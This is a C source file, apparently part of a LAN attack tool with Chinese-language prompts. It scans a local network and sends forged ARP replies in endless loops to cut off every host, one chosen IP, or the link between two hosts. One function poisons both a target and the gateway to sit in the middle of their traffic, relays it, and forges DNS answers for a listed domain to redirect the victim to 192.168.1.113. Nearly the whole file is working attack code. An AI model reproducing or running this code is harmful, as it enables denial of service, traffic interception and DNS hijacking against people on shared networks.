/*===============================================================
*   Copyright (C) 2017 All rights reserved.
*   
*   文件名称：function.c
*   创 建 者：陈迪林
*   创建日期：2017年07月26日
*   描    述：
*
*   更新日志：
*
================================================================*/
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <pthread.h>

#include "socket.h"

unsigned char cheat_mac[6] = {0x0f,0x0f,0x29,0x34,0x4d,0xef};

int one()
{
	int ip[255]={0};
	unsigned char mac[255][6];
	int size;
	int i;
	struct in_addr inaddr;
	printf("查找主机中.....\n");
	if(-1 == find_host(mac, ip, &size))
		return -1;
	for(i=0;i<size;i++)
	{
		inaddr.s_addr = ip[i];
		char *p =  inet_ntoa(inaddr);
		if(mac[i][0] == 0x00 && mac[i][1] == 0x0c && mac[i][2] == 0x29)
			printf("%s -> %02x:%02x:%02x:%02x:%02x:%02x  Vmware mac address.\n", p, mac[i][0], mac[i][1], mac[i][2], mac[i][3], mac[i][4], mac[i][5]);
		else
			printf("%s -> %02x:%02x:%02x:%02x:%02x:%02x\n", p, mac[i][0], mac[i][1], mac[i][2], mac[i][3], mac[i][4], mac[i][5]);
	}
	printf("发现%d台主机.\n",size);
}

int two()
{
	printf("[1]局域网所有主机断网.\n");
	printf("[2]指定IP断网.\n");
	printf("[3]断开两台主机..\n");
	printf(".................................  ");
	printf("选择功能:");
	int option;
	scanf("%d",&option);
	if(option == 1)
	{			
		int ip[255]={0};
		unsigned char mac[255][6];
		int size;
		if(-1 == find_host(mac, ip, &size))
			return -1;
		int i;
		int gateway = getgateway();
		ARPFRAME arpdat;
		int cnt = 0;
		while(1)
		{		
			for(i=0;i<size;i++)
			{
				fill_arp_frame(&arpdat, 2, &mac[i][0], cheat_mac, gateway, ip[i]);
				send_data(&arpdat, sizeof arpdat);
				usleep(200000); /* delay 100ms */
			}
			cnt += size;
			printf(">发送第%d个欺骗数据包.\n",cnt);
		}
	}
	else if(option == 2)
	{
		char p[20];
		unsigned char mac[6];
		printf("...................................  ");
		printf("目标ip:");
		scanf("%s",p);
		int i;
		int dstip = inet_addr(p);
		if(-1 == getmacbyip(p,mac))
			return -1;
		
		int gateway = getgateway();
		
		ARPFRAME arpdat;
		fill_arp_frame(&arpdat, 2, mac, cheat_mac, gateway, dstip);
		int cnt = 0;
		while(1)
		{	
			send_data(&arpdat, sizeof arpdat);
			usleep(1000000);
			cnt++;
			printf(">发送第%d个欺骗数据包.\n",cnt);
		}
	}
	else if(option == 3)
	{
		char p[20];
		unsigned char mac[6];
		printf("...................................  ");
		printf("目标IP1:");
		scanf("%s",p);
		int srcip = inet_addr(p);
		printf("...................................  ");
		printf("目标IP2:");
		scanf("%s",p);
		int i;
		int dstip = inet_addr(p);
		if(-1 == getmacbyip(p,mac))
			return -1;
		
		ARPFRAME arpdat;
		fill_arp_frame(&arpdat, 2, mac, cheat_mac, srcip, dstip);
		int cnt = 0;
		while(1)
		{	
			send_data(&arpdat, sizeof arpdat);
			usleep(1000000);
			cnt++;
			printf(">发送第%d个欺骗数据包.\n",cnt);
		}
	}
	else
	{
		printf("输入错误.\n");
	}
}

static void *p_send_data(void *data)
{
	int send_sock;
	if((send_sock=socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("send creat error");
		return NULL;
	}

	struct sockaddr_ll toaddr;
	struct ifreq ifr;
	bzero(&toaddr,sizeof(toaddr));
	bzero(&ifr,sizeof(ifr));
	strcpy(ifr.ifr_name, IF_NAME); /*用于获取IF_NAME网卡索引*/

	if(-1 == ioctl(send_sock,SIOCGIFINDEX,&ifr))/**/
	{
		perror("get dev index error");
		return NULL;
	}
	toaddr.sll_ifindex = ifr.ifr_ifindex; /* 网卡索引 发送和接收数据时需要用到网卡的索引 */
	toaddr.sll_family = PF_PACKET; /* 获取数据链路层数据 */

	while(1)
	{
		/* 发送构造好的以太网数据帧 广播每台主机 */
		if(42 != sendto(send_sock, data, 42, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
		{
			perror("send error");
			return NULL;
		}
		usleep(4000000);
	}

	close(send_sock);
}

int three()
{	
	char target_ip[20]={0};
	printf("...................................  ");
	printf("目标IP:");
	scanf("%s",target_ip);
	int dstip = inet_addr(target_ip);
	// unsigned char *dst_host = (unsigned char *)&dstip;
	unsigned char localmac[6],dstmac[6],gatewaymac[6];

	getlocalmac(localmac);

	int gateway = getgateway();
    struct in_addr inaddr;
    inaddr.s_addr = gateway;
    char *gateway_ip = inet_ntoa(inaddr); /* 获得网关MAC地址 */

	if(-1 == getmacbyip(target_ip,dstmac))
		return -1;
	if(-1 == getmacbyip(gateway_ip,gatewaymac))
		return -1;
	
    ARPFRAME arpdat,arpdat2;
    
	fill_arp_frame(&arpdat2, 2, gatewaymac, localmac, dstip, gateway);/* 欺骗网关 */
	fill_arp_frame(&arpdat, 2, dstmac, localmac, gateway, dstip);/* 欺骗目标主机 */
	
	int sock;	
	if((sock=socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
			perror("socket create error");
			return -1;
	}

	struct sockaddr_ll toaddr;
	struct ifreq ifr;
	bzero(&toaddr,sizeof(toaddr));
	bzero(&ifr,sizeof(ifr));
	strcpy(ifr.ifr_name, IF_NAME); /*用于获取IF_NAME网卡索引*/

	if(-1 == ioctl(sock,SIOCGIFINDEX,&ifr))/**/
	{
		perror("get dev index error");
		return -1;
	}
	toaddr.sll_ifindex = ifr.ifr_ifindex; /* 网卡索引 发送和接收数据时需要用到网卡的索引 */
	toaddr.sll_family = PF_PACKET; /* 获取数据链路层数据 */

	unsigned char recv_buff[5000];
	pthread_t t,t1;
	pthread_create(&t, NULL, p_send_data, &arpdat); /* 开启一个线程用于dsthost欺骗 */
	pthread_create(&t1, NULL, p_send_data, &arpdat2); /* 开启一个线程用于gateway欺骗 */

    u16 _arp;
    u16 _ipv4;
    u16 _dns_port;
    _ipv4 = htons(ipv4_prot);
    _arp = htons(arp_prot);
    _dns_port = htons(dns);
    
    int send_enable = 1;
    char *Hdn[100] = {"163", NULL};
    u8 DNS_response_pack[1000]={0};
	while(1)
	{
		int recv_size = recvfrom(sock, recv_buff, 5000, 0, NULL, NULL);
        
        ip_datagram *ip = (ip_datagram *)recv_buff;
        send_enable = 1;
        
        /* 收到目标主机发送至网关的数据帧 */
        if(ip->iphdr.srcip == dstip)
        {
	        if(ip->ethhdr.type == _ipv4)
	        {
                if(ip->iphdr.protocol == udp_prot) /* UDP */
                {
                    udp_datagram *udp = (udp_datagram *)recv_buff;
                    if(udp->udphdr.dstport == _dns_port) /* DNS服务 */
                    {
                    	/* Resolve the target access domain name */
                        char domain[100] = {0};
                        char *pdomain = domain;
                        dns_datagram *dnsframe = (dns_datagram *)recv_buff;
                        int length_1 = (int)dnsframe->domain[0];
                        char *p = dnsframe->domain;
                        p = p + 1 + length_1;
                        int length_2 = (int)*p;
                        p++;
                        while(length_2)
                        {
                            *pdomain = *p;
                            p++;
                            pdomain++;
                            length_2--;
                        }
                        printf("%s\n",domain);
                        int i = 0;
                        while(Hdn[i] != NULL)
                        {
                        	if(!strcmp(domain, Hdn[i]))
                        	{
                        		send_enable = 0;
                        		//srcmac dstmac
                        		//srcip dstip checksum length = length + 16
                        		//srcport dstport checksum length = length + 16 
                        		//dns flags answer authority additional 
                        		//DNS response

                        		//Construct DNS response packs

                        		memcpy(DNS_response_pack, recv_buff, recv_size);
                        		dns_datagram *response_dns = (dns_datagram *)DNS_response_pack;
                        		//srcmac dstmac
                        		memcpy(response_dns->ethhdr.dst, dstmac, 6);
                        		memcpy(response_dns->ethhdr.src, localmac, 6);
                        		//srcip dstip checksum length = length + 16
                        		response_dns->iphdr.srcip = dnsframe->iphdr.dstip;
                        		response_dns->iphdr.dstip = dnsframe->iphdr.srcip;
                        		response_dns->iphdr.total_length = htons(ntohs(response_dns->iphdr.total_length) + 16);

                        		response_dns->iphdr.check_sum = 0;
                        		u16 ip_check_sum = check_sum((u16 *)&dnsframe->iphdr.length_ver, sizeof(ip_header));
                        		response_dns->iphdr.check_sum = htons(ip_check_sum);

                        		//srcport dstport checksum length = length + 16
                        		response_dns->udphdr.srcport = dnsframe->udphdr.dstport;
                        		response_dns->udphdr.dstport = dnsframe->udphdr.srcport;
                        		response_dns->udphdr.total_length = htons(ntohs(response_dns->udphdr.total_length) + 16);
                        		response_dns->flags = htons(0x8180);
                        		response_dns->answer_rrs = htons(1);//1 answer
                        		//dns answer info
                        		udp_whdr whdr;
                        		dns_answer answer;
                        		answer.name = htons(0xc00c);
                        		answer.type = htons(0x0001);
                        		answer.class = htons(0x0001);
                        		answer.ttl = htonl(16);
                        		answer.datalength = htons(0x0004);
                        		answer.ipaddr = inet_addr("192.168.1.113");
                        		u8 sd[16] = {0x5a};
                        		memset(sd,0x5a,16);
                        		//wei header
                        		whdr.srcip = response_dns->iphdr.srcip;
                        		whdr.dstip = response_dns->iphdr.dstip;
                        		whdr.zero = 0;
                        		whdr.protocol = 0x11; /* udp */
                        		whdr.length = recv_size - sizeof(ip_datagram) + 16; /* udphdr and udpdata length */
                        		int check_sum_length = whdr.length + 12;
                        		//udp header
                        		int domainsize = recv_size - sizeof(udp_datagram) - 12;
                        		memcpy(whdr.udphdr, &response_dns->udphdr.srcport, 8);
                        		memcpy(whdr.udpdata, &response_dns->transactionid, domainsize);
                        		memcpy(whdr.udpdata+domainsize, &answer, 16);
                        		//cacl check_sum
                        		response_dns->udphdr.check_sum = 0;
                        		u16 udp_check_sum = check_sum((u16 *)&whdr, check_sum_length);
                        		response_dns->udphdr.check_sum = htons(udp_check_sum);
                        		//add answer
                        		// printf("name=%x\n",answer.name);
                        		// printf("type=%x\n",answer.type);
                        		// printf("class=%x\n",answer.class);
                        		// printf("ttl=%x\n",answer.ttl);
                        		// printf("datalength=%x\n",answer.datalength);
                        		// printf("ipaddr=%x\n",answer.ipaddr);
                        		printf("domainsize=%d\n",domainsize);
                        		memcpy(response_dns->domain+domainsize, &answer, 16);
                        		int response_totalsize = recv_size + 16;
                        		if(response_totalsize != sendto(sock, DNS_response_pack, response_totalsize, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
			                    {
			                        perror("send error");
			                    } 
                        		break;
                        	}
                        	i++;
                        }
                    }
                }
	            if(1 == send_enable)
                {
                    memcpy(ip->ethhdr.dst,gatewaymac,6);/* 修改数据包中元mac地址为本机mac，目标mac为网关mac */
                    memcpy(ip->ethhdr.src,localmac,6);
                    if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
                    {
                        perror("send error");
                    } 
                }
	        }
        }
        
        /* 收到网关发送至目标主机的数据帧 */
        if(ip->iphdr.dstip == dstip)
        {
            memcpy(ip->ethhdr.dst,dstmac,6);
            memcpy(ip->ethhdr.src,localmac,6);
            if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
            {
                perror("send error");
            } 
        }
        
    }
}


int four()
{
	char target_ip[20]={0};
	printf("...................................  ");
	printf("目标IP:");
	scanf("%s",target_ip);
	int dstip = inet_addr(target_ip);

	int ip[255]={0};
	unsigned char mac[255][6];
	int size;
	if(-1 == find_host(mac, ip, &size))
			return -1;
	int i;

	ARPFRAME arpdat;
	int cnt = 0;
	while(1)
	{		
		for(i=0;i<size;i++)
		{
			fill_arp_frame(&arpdat, 2, &mac[i][0], cheat_mac, dstip, ip[i]);
			send_data(&arpdat, sizeof arpdat);
			usleep(200000); /* delay 100ms */
		}
		cnt += size;
		printf(">发送第%d个欺骗数据包.\n",cnt);
	}
}



